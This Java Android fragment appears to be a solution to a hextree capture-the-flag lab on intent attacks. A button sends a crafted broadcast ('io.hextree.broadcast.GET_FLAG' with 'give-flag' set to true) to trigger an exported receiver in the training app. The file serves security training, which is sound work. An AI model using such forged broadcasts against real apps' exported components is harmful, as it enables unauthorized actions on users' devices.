package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag20Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag20, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag20);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setAction("io.hextree.broadcast.GET_FLAG");
            intent.putExtra("give-flag", true);
            getContext().sendBroadcast(intent);
        });
        return view;
    }
}